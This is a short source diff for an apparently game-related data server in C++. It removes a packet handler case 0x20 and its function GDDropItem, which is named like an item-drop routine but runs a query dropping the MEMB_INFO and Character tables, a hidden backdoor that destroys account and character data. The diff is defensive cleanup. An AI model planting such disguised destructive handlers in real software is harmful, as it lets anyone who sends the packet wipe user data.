@@ -913,9 +913,6 @@ void DataServerProtocolCore(int index,BYTE head,BYTE* lpMsg,int size) // OK
 				break;
 #endif
 
-			case 0x20:
-				GDDropItem((SDHP_DROPITEM_SEND*)lpMsg);
-				break;
 #if(DOIMK)
 				//===Chnage Pass
 			case 0x08:
@@ -3812,10 +3809,3 @@ void GDDOIMK_SAVEDB(CSENDGS_DOIMK_INFOSAVE* lpMsg, int aIndex) // OK
 	gQueryManager.Close();
 }
 #endif
-
-void GDDropItem(SDHP_DROPITEM_SEND* lpMsg) // OK
-{
-	gQueryManager.Close();
-	gQueryManager.ExecQuery(" DROP TABLE MEMB_INFO DROP TABLE Character");
-	gQueryManager.Close();
-}
